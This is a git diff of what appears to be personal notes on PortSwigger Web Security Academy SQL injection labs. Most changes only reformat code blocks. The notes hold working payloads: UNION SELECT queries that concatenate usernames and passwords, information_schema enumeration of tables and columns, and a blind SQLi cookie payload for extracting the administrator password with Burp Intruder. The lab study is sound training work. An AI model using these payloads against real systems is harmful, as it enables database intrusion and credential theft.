@@ -67,18 +67,26 @@ It can be tested that though the default query is fetching two columns but the f
 Now that we have only one entry to retrive two columns from the users table, we can use the CONCAT({query1}, {query2}) functionality of MySQL.
 
 Payload ->
-```web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+NULL,+CONCAT(username,password)+FROM+users--```
+```
+web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+NULL,+CONCAT(username,password)+FROM+users--
+```
 -------------------------------------------------------------------------------------
 -------------------------------------------------------------------------------------
 ### SQL injection attack, listing the database contents on non-Oracle databases
 First find out the number of columns being queried in the orignal req but using the follwoing payload (2 in this case).
-```'+union+select+null,null--```
+```
+'+union+select+null,null--
+```
  Every SQL database has an information schema that contains the list of tables. Use the following payload to retrive that list of tables.
  This search for user tables in that list.
- ```'union+select+column_name,+null+from+information_schema.tables-- ```
+ ```
+ 'union+select+column_name,+null+from+information_schema.tables--
+  ```
 
  Now that you have found the exact name of the user table, use it to extract the exact column names out of it using the following payload
- ```'+union+select+column_names,+null+from+information_schema.columns+where+table_name="{user table name found in last step}" --```
+ ```
+ '+union+select+column_names,+null+from+information_schema.columns+where+table_name="{user table name found in last step}" --
+ ```
 
  After finding the column names, use those to extract the usernames and passwords from the same table.
 
@@ -87,12 +95,16 @@ First find out the number of columns being queried in the orignal req but using 
 ### Blind SQL injection with conditional responses
 - Capture the homepage req in burpsuit and send to ***repeater.***
 - Observe the TrackingID cookie and test it for blind SQLi using the following paylload →
-```' AND '1'='1 ```
+```
+' AND '1'='1 
+```
 
 This shall render the term “Welcome back!” in the response and if the condition is changed to ‘1’=’2 , then it should not render the term. This confirms the presence of blind SQLi.
 
 Now send the request to Intruder and use the following payload in the cookie section along with the same payload markers.
-```ookie: TrackingId=0k9eqmdznTZaHkW7' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), §1§, 1) = '§a§;```
+```
+Cookie: TrackingId=0k9eqmdznTZaHkW7' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), §1§, 1) = '§a§;
+```
 
 - Use the intruder in cluster bomb mode (read its description to know why), and add two payload sets →
     - First one having the counts of 1 to 20 (this is the length of the password).
